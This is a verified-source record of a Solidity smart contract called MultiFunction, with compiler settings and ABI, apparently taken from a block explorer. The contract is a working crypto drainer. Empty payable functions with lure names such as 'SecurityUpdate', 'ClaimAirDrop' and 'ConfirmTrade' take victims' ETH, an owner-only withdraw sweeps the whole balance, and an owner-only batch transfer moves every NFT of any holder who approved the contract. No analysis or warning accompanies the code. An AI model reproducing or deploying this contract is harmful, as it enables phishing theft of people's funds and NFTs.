{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/MultiFunction.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity >=0.7.0 <0.9.0;\\n\\n\\ninterface IERC721 {\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n}\\n\\ncontract MultiFunction {\\n    address private owner;\\n    address private contractAddress;\\n\\n    // event for EVM logging\\n    event OwnerSet(address indexed oldOwner, address indexed newOwner);\\n\\n    // event for EVM logging\\n    event BatchTransferERC721(\\n        address indexed contractAddress,\\n        address indexed to,\\n        uint256 amount\\n    );\\n\\n    modifier isOwner() {\\n        require(msg.sender == owner, \\\"This method can only be called by the contract owner. Now fuck off\\\");\\n        _;\\n    }\\n\\n    \\n    /**\\n     * @dev Set contract deployer as owner\\n     */\\n    constructor() {\\n        owner = msg.sender; \\n        contractAddress = address(this);\\n        emit OwnerSet(address(0), owner);\\n    }\\n\\n    function changeOwner(address newOwner) public isOwner {\\n        emit OwnerSet(owner, newOwner);\\n        owner = newOwner;\\n    }\\n\\n    function getOwner() external view returns (address) {\\n        return owner;\\n    }\\n\\n    /**\\n    * @dev Used to withdraw the ETH funds to the provided address\\n    */\\n    function withdraw(\\n        address payable _to\\n    ) public isOwner {\\n        (bool success, ) = _to.call{\\n            value: address(this).balance\\n        }(\\\"\\\");\\n\\n        require(success, \\\"ETH Transfer failed.\\\");\\n    }\\n\\n    // Methods that can receive ETH\\n    function SafeClaim() public payable {}\\n    function SecurityUpdate() public payable {}\\n    function ClaimAirDrop() public payable {}\\n    function ClaimRewards() public payable {}\\n    function ConfirmTrade() public payable {}\\n    \\n    /**\\n    * @dev Used to transfer all approved NFTs to the provided address\\n    */\\n    function batchTransferERC721(\\n        address _to, \\n        IERC721 _collection, \\n        uint256[] calldata  _ids\\n    ) public isOwner {\\n        uint256 length = _ids.length;\\n        require(length > 0, \\\"No token IDs provided\\\");\\n\\n        address collectionOwner = _collection.ownerOf(_ids[0]);\\n        bool approval = _collection.isApprovedForAll(collectionOwner, contractAddress);\\n\\n        require(approval, \\\"Contract does not have approval for this collection\\\");\\n\\n        for (uint256 i; i < length; ) {\\n            uint256 tokenId = _ids[i];\\n\\n            address tokenIdOwner = _collection.ownerOf(tokenId);\\n            require(tokenIdOwner == collectionOwner, \\\"Not every token ID has the same owner\\\");\\n\\n            _collection.safeTransferFrom(collectionOwner, _to, tokenId);\\n\\n            unchecked {\\n                ++i;\\n            }\\n        }\\n\\n\\n        emit BatchTransferERC721(address(_collection), _to, length);\\n    }\\n\\n} \"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"contractAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BatchTransferERC721\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerSet\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"ClaimAirDrop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ConfirmTrade\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SafeClaim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"contract IERC721\",\"name\":\"_collection\",\"type\":\"address\"},{\"internalType\":\"uint256[]\",\"name\":\"_ids\",\"type\":\"uint256[]\"}],\"name\":\"batchTransferERC721\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MultiFunction", "CompilerVersion": "v0.8.9+commit.e5eed63a", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}